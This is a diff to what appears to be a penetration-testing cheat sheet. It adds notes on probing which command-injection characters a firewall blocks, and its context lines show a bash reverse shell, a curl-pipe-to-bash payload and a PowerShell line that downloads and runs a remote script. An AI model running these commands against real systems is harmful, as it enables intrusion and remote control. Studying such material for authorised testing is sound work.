@@ -983,6 +983,16 @@ bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
 Then on the server side, use `curl http://IP/rev.sh | bash` 
 or similar tool as your injection payload.
 
+### Command injection payload choices
+Sometimes an application might have firewall or defences in-place,
+it means some special characters might be blocked.
+Common command injection special characters are `;"|'&$`
+
+If you found that an application consist of a firewall/defence,
+try and see which characters are banned and which are not.
+Sometimes it allows `'` but not `"`, vice versa.
+Sometimes it allows `;` but not `|`, vice versa.
+
 ### Starting a windows conptyshell in background (can use it via a web shell to call conptyshell directly)
 ```cmd
 start /B powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/rev.ps1')"
